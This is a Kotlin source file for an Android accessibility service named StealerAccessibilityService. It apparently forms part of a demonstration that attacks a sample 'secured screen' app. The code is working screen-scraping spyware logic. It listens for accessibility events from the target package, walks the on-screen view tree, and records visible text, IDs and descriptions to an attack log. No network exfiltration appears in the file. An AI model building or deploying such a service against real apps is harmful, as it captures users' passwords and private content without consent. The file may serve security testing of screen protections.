package com.grigorevmp.attacker

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class StealerAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        AttackLogStore.append("${timestamp()} service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val safeEvent = event ?: return
        val packageName = safeEvent.packageName?.toString() ?: return
        if (packageName != TARGET_PACKAGE) {
            return
        }

        val lines = mutableListOf<String>()
        val eventTexts = safeEvent.text
            .map { it.toString().trim() }
            .filter { it.isNotBlank() }
        if (eventTexts.isNotEmpty()) {
            lines += "event.text=${eventTexts.joinToString(" | ")}"
        }
        safeEvent.contentDescription
            ?.toString()
            ?.takeIf { it.isNotBlank() }
            ?.let { lines += "event.contentDescription=$it" }

        val source = safeEvent.source
        if (source != null) {
            val dumped = mutableListOf<String>()
            dumpNode(source, 0, dumped)
            source.recycle()
            lines += dumped
        }

        val root = rootInActiveWindow
        if (root != null) {
            val snapshot = mutableListOf<String>()
            dumpNode(root, 0, snapshot)
            root.recycle()
            if (snapshot.isNotEmpty()) {
                lines += "root.snapshot"
                lines += snapshot.take(10)
            } else {
                lines += "root.snapshot=empty_or_hidden"
            }
        } else {
            lines += "root.snapshot=unavailable"
        }

        if (lines.isNotEmpty()) {
            AttackLogStore.append(
                buildString {
                    append(timestamp())
                    append(' ')
                    append(eventTypeName(safeEvent.eventType))
                    append('\n')
                    append(lines.take(25).joinToString(separator = "\n"))
                },
            )
        }
    }

    override fun onInterrupt() {
        AttackLogStore.append("${timestamp()} service interrupted")
    }

    private fun dumpNode(
        node: AccessibilityNodeInfo,
        depth: Int,
        out: MutableList<String>,
    ) {
        if (out.size >= 25) {
            return
        }

        val text = node.text?.toString()?.trim().orEmpty()
        val contentDescription = node.contentDescription?.toString()?.trim().orEmpty()
        val viewId = node.viewIdResourceName.orEmpty()
        val className = node.className?.toString().orEmpty()

        if (text.isNotEmpty() || contentDescription.isNotEmpty() || viewId.isNotEmpty() || depth == 0) {
            out += buildString {
                append("node(depth=")
                append(depth)
                append(", class=")
                append(className.substringAfterLast('.'))
                if (viewId.isNotEmpty()) {
                    append(", id=")
                    append(viewId)
                }
                if (text.isNotEmpty()) {
                    append(", text=")
                    append(text)
                }
                if (contentDescription.isNotEmpty()) {
                    append(", cd=")
                    append(contentDescription)
                }
                append(')')
            }
        }

        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            try {
                dumpNode(child, depth + 1, out)
            } finally {
                child.recycle()
            }
        }
    }

    private fun eventTypeName(type: Int): String {
        return when (type) {
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "TYPE_VIEW_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TYPE_VIEW_TEXT_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "TYPE_WINDOW_CONTENT_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "TYPE_WINDOW_STATE_CHANGED"
            else -> "TYPE_$type"
        }
    }

    private fun timestamp(): String {
        return timeFormat.format(Date())
    }

    private companion object {
        private const val TARGET_PACKAGE = "com.grigorevmp.securedscreen"
        private val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.US)
    }
}
